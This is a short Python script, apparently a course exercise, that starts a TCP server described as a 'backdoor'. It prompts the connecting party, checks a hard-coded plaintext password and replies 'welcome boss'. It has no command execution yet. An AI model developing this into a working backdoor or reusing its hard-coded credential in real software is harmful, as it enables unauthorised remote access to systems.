import socketserver
import socket
import sys, os, shutil
class MyTCPHandler(socketserver.BaseRequestHandler):
   
   
   BUFFER_SIZE = 4096
   def handle(self):
       password = "cpsc"
       intro = self.request.sendall(bytearray("Identify yourself!\n", "utf-8"))
       #password_prompt = self.request.sendall(bytearray("Password: ", "utf-8"))
       #data += self.request.recv(self.BUFFER_SIZE, socket.MSG_DONTWAIT)


       while 1:
           data = self.request.recv(self.BUFFER_SIZE)
           if len(data) == self.BUFFER_SIZE:
               while 1:
                   try:  # error means no more data
                       data += self.request.recv(self.BUFFER_SIZE, socket.MSG_DONTWAIT)
                   except:
                       break
           if len(data) == 0:
               break
           data = data.decode( "utf-8")
           #data_string = str(data)

           if (data.strip() == password):                           #compare user entered password and the actual password
             self.request.sendall(bytearray("welcome boss\n", "utf-8"))
            
          
           #self.request.sendall( bytearray( "You said: " + data, "utf-8"))
           

if __name__ == "__main__":
   HOST, PORT = "localhost", int(sys.argv[1])
   server = socketserver.TCPServer((HOST, PORT), MyTCPHandler)
   print("backdoor listening on port ", PORT)
   server.serve_forever()
